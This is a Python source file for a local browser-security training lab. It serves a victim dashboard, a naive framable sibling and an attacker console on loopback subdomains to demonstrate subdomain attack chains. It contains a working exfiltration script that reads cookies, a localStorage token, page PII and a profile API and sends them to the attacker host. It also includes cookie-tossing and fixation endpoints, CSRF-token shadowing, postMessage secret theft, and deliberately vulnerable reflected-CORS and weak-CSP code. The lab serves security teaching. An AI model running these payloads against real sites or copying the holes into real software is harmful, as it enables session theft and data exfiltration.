#!/usr/bin/env python3
"""
RinP SubChain lab: a victim app, a naive sibling and your controlled subdomain,
all on *.localtest.me (public DNS that resolves to 127.0.0.1).

Run:  python3 lab/server.py
Open: http://app.localtest.me:8901/?csp=0     (the victim dashboard)
      http://evil.localtest.me:8901/          (the attacker console)
Then follow lab/GUIDE.md.

Everything stays on your loopback; the PII, tokens and API keys are fake.
"""
import http.server
import json
import threading
import time

PORT = 8901
ROOT = ".localtest.me"
LOG_LOCK = threading.Lock()
LOG = []

CSP_VARIANTS = {
    "0": None,
    "1": "script-src 'self' *{r}",
    "2": "script-src 'self' http://*{r}",
    "3": "script-src 'self' *{r}:8901",
    "4": "script-src 'self' http://evil{r}:8901",
    "5": "script-src 'self' http://*{r}:*",
}


def csp_for(cb):
    raw = CSP_VARIANTS.get(cb, CSP_VARIANTS["0"])
    return raw.format(r=ROOT) if raw else None


def record(handler, tag):
    with LOG_LOCK:
        LOG.append({"time": time.strftime("%H:%M:%S"), "tag": tag,
                    "path": handler.path[:160],
                    "cookie": handler.headers.get("Cookie")})
        del LOG[:-200]


EVIL_SCRIPT = b"""
(async () => {
  const data = {
    via: 'script served by evil.localtest.me, running inside the app origin',
    cookie: document.cookie,
    localStorage_auth_token: localStorage.getItem('auth_token'),
    dom_secret: document.getElementById('profile').textContent.trim(),
    profile_api: await fetch('/api/profile').then(r => r.text()).catch(e => '' + e)
  };
  await fetch('http://evil.localtest.me:8901/exfil?d=' +
              encodeURIComponent(JSON.stringify(data)));
})();
"""

APP_PAGE = """<!doctype html><html><head><style>
body{font-family:system-ui;margin:2rem auto;max-width:44rem;line-height:1.5}
.card{border:1px solid #ccc;border-radius:8px;padding:1rem;margin:1rem 0}
code{background:#f4f4f4;padding:2px 6px;border-radius:4px}
a{margin-right:1rem}
</style></head><body>
<h1>app.localtest.me &mdash; victim dashboard (CSP variant __CB__)</h1>
<p>Variant switch:
<a href="/?cb=0">0: none</a><a href="/?cb=1">1: *.localtest.me</a>
<a href="/?cb=2">2: http://*.localtest.me</a><a href="/?cb=3">3: *:8901</a>
<a href="/?cb=4">4: exact host</a><a href="/?cb=5">5: http://*:*</a></p>
<div class="card" id="profile">PII: Gedik Testuser, gedik@corp.example, TR
&mdash; account role: admin</div>
<div class="card">Cookies set on this page:
<ul><li><code>session</code> Domain=.localtest.me, HttpOnly (server session)</li>
<li><code>strictck</code> Domain=.localtest.me, SameSite=Strict</li>
<li><code>csrftoken</code> host-only (no Domain attribute)</li></ul>
Open DevTools &rarr; Application &rarr; Cookies to see them, then
<a href="/whoami"><code>/whoami</code></a> shows what the server receives.</div>
<script>localStorage.setItem('auth_token',
 'eyJhbGci.VICTIM-LOCALSTORAGE-JWT.b64');</script>
<script src="http://evil.localtest.me:8901/script.js"></script>
<p id="csp-note">This page has __CSPDESC__. Watch the console for what the
browser does with the script from evil.localtest.me.</p>
</body></html>"""

WHOAMI_PAGE = """<!doctype html><html><head><style>
body{font-family:monospace;margin:2rem auto;max-width:44rem;word-break:break-all}
</style></head><body>
<h3>app.localtest.me/whoami &mdash; the Cookie header your browser just sent</h3>
__COOKIE__
<p><a href="/whoami">reload</a> | <a href="/">back to dashboard</a></p>
</body></html>"""

EVIL_CONSOLE = """<!doctype html><html><head><style>
body{font-family:system-ui;margin:2rem auto;max-width:52rem;line-height:1.5}
.card{border:1px solid #a33;border-radius:8px;padding:1rem;margin:1rem 0;background:#fff7f7}
pre{background:#111;color:#9f9;padding:.8rem;border-radius:6px;overflow:auto;font-size:.85rem}
button{margin:.2rem .4rem .2rem 0;padding:.4rem .8rem}
iframe{width:100%;height:120px;border:1px dashed #a33;border-radius:6px}
.small{color:#666;font-size:.85rem}
</style></head><body>
<h1>evil.localtest.me &mdash; attacker console (your controlled subdomain)</h1>

<div class="card"><b>1. What JavaScript can read here
(<code>document.cookie</code>)</b>
<pre id="jsview">loading...</pre>
<span class="small">Note the HttpOnly <code>session</code> is missing. Now look
what your browser still sent to this server below.</span></div>

<div class="card"><b>2. What this server captured from your requests</b>
<button onclick="act('/toss')">TOSS session=FIXATED</button>
<button onclick="act('/shadow')">SHADOW csrftoken</button>
<button onclick="act('/tryhost')">TRY __Host- (should fail)</button>
<span class="small">after TOSS/SHADOW, open
<a href="http://app.localtest.me:8901/whoami">app /whoami</a> and reload</span>
<pre id="log">loading...</pre></div>

<div class="card"><b>3. CSP chain: what the app executed from here</b>
<span class="small">open the app with <a href="http://app.localtest.me:8901/?cb=3">variant 3</a>
(allowed) vs <a href="http://app.localtest.me:8901/?cb=1">variant 1</a>
(blocked on this port), then refresh this log.</span>
<pre id="exfil">loading...</pre></div>

<div class="card"><b>4. Framing + postMessage against the naive sibling</b>
<iframe id="f" src="http://victim2.localtest.me:8901/"></iframe><br>
<button onclick="pm()">send message</button>
<pre id="pmout">reply appears here</pre></div>

<script>
async function refresh(){
  document.getElementById('jsview').textContent = document.cookie || '(empty)';
  const r = await fetch('/log.json'); const log = await r.json();
  document.getElementById('log').textContent =
    log.slice().reverse().map(e => e.time + '  ' + e.tag + '\\n  cookie: ' +
      (e.cookie || '(none)')).join('\\n') || '(no requests yet)';
  const ex = log.filter(e => e.tag.includes('exfil'));
  document.getElementById('exfil').textContent =
    ex.slice(-3).map(e => decodeURIComponent(
      e.path.split('d=')[1] || e.path.split('pm=')[1] || '')).join('\\n\\n')
    || '(nothing exfiltrated yet - visit the app with CSP variant 3)';
}
async function act(u){
  const r = await fetch(u); const t = await r.text();
  document.getElementById('log').textContent =
    'ACTION ' + u + ' -> ' + t + '\\n(reload app /whoami now)';
  refresh();
}
async function pm(){
  const f = document.getElementById('f');
  const p = new Promise(res => window.addEventListener('message', res, {once:true}));
  f.contentWindow.postMessage('ping', '*');
  const e = await p;
  document.getElementById('pmout').textContent = JSON.stringify(e.data);
  fetch('/exfil?pm=' + encodeURIComponent(JSON.stringify(e.data)));
}
refresh(); setInterval(refresh, 3000);
</script></body></html>"""

VICTIM2_PAGE = """<!doctype html><html><body style="font-family:system-ui">
<h4 style="margin:.4rem">victim2.localtest.me (framable, naive listener)</h4>
<script>
window.addEventListener('message', function(e){
  e.source.postMessage({secret: 'victim2-postmessage-secret-88'}, e.origin);
});
</script></body></html>"""


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def reply(self, status, headers, body):
        self.send_response(status)
        for k, v in headers:
            self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def html(self, body, headers=()):
        body = body.encode()
        self.reply(200, list(headers) + [
            ("Content-Type", "text/html; charset=utf-8"),
            ("Cache-Control", "no-store"),
            ("Content-Length", str(len(body)))], body)

    def do_GET(self):
        host = self.headers.get("Host", "").split(":")[0]
        origin = self.headers.get("Origin")
        path = self.path.split("?")[0]
        cb = self.path.split("cb=")[-1][:2] if "cb=" in self.path else "0"

        if host == "app" + ROOT:
            if path == "/api/profile":
                record(self, "app-api-profile")
                body = json.dumps({"user": "Gedik Testuser",
                                   "mail": "gedik@corp.example",
                                   "role": "admin",
                                   "api_key": "sk-live-7742"}).encode()
                self.reply(200, [("Content-Type", "application/json")], body)
                return
            if path == "/api":
                if origin:
                    self.reply(200, [
                        ("Access-Control-Allow-Origin", origin),
                        ("Access-Control-Allow-Credentials", "true")],
                        b'{"secret":"app-cors-secret-42"}')
                else:
                    self.reply(403, [], b"no origin header")
                return
            if path == "/whoami":
                record(self, "app-whoami")
                cookie = self.headers.get("Cookie", "(none)")
                self.html(WHOAMI_PAGE.replace("__COOKIE__", cookie))
                return
            record(self, "app-page")
            csp = csp_for(cb)
            headers = [
                ("Set-Cookie", "session=appsecret; Domain=" + ROOT +
                 "; Path=/; HttpOnly"),
                ("Set-Cookie", "strictck=1; Domain=" + ROOT +
                 "; Path=/; SameSite=Strict"),
                ("Set-Cookie", "csrftoken=csrf-9f3a1; Path=/")]
            if csp:
                headers.append(("Content-Security-Policy", csp))
            desc = "NO Content-Security-Policy" if not csp else "CSP: " + csp
            self.html(APP_PAGE.replace("__CB__", cb)
                      .replace("__CSPDESC__", desc), headers)
            return

        if host == "victim2" + ROOT:
            record(self, "victim2-framed")
            self.html(VICTIM2_PAGE)
            return

        # evil.localtest.me - the controlled subdomain
        record(self, "evil" + path)
        if path == "/log.json":
            with LOG_LOCK:
                body = json.dumps(LOG[-50:]).encode()
            self.reply(200, [("Access-Control-Allow-Origin", "*"),
                             ("Content-Type", "application/json")], body)
            return
        if path == "/exfil":
            self.reply(200, [("Access-Control-Allow-Origin", "*")], b"logged")
            return
        if path == "/script.js":
            self.reply(200, [("Content-Type", "application/javascript"),
                             ("Content-Length", str(len(EVIL_SCRIPT)))],
                       EVIL_SCRIPT)
            return
        if path == "/toss":
            self.reply(200, [("Set-Cookie", "session=FIXATED; Domain=" +
                              ROOT + "; Path=/; HttpOnly")], b"tossed")
            return
        if path == "/shadow":
            self.reply(200, [("Set-Cookie", "csrftoken=EVILSHADOW; Domain=" +
                              ROOT + "; Path=/")], b"shadowed")
            return
        if path == "/tryhost":
            self.reply(200, [("Set-Cookie", "__Host-k=pwn; Domain=" + ROOT +
                              "; Path=/; Secure")], b"browser should reject")
            return
        self.html(EVIL_CONSOLE)


if __name__ == "__main__":
    server = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    print("RinP SubChain lab running on http://127.0.0.1:%d" % PORT)
    print("  victim dashboard : http://app%s:%d/?cb=0" % (ROOT, PORT))
    print("  attacker console : http://evil%s:%d/" % (ROOT, PORT))
    print("  naive sibling    : http://victim2%s:%d/" % (ROOT, PORT))
    print("follow lab/GUIDE.md for the walkthrough")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
